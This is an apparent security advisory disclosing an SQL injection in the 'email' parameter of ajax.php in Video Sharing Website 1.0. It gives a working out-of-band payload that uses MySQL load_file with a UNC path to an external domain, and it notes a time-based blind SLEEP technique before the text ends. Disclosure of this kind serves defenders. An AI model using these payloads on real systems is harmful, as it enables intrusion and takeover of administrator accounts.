## Title: Video Sharing Website 1.0 SQL - Injection
## Author: nu11secur1ty
## Vendor: https://www.sourcecodester.com/users/tips23
## Software: https://www.sourcecodester.com/php/14584/video-sharing-website-using-phpmysqli-source-code.html

## Description:
The `email` parameter from `ajax.php` app of Video Sharing Website 1.0
appears to be vulnerable to SQL injection attacks. The payload
'+(select load_file('\\\\dhy5y62urpxije56fiteqimmjdp6dy6mxplh87ww.nu11secur1ty.net\\pkq'))+'
was submitted in the email parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed. The attacker can take administrator
account controll on this system.
Status: CRITICAL

[+] Payload:

```mysql

Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
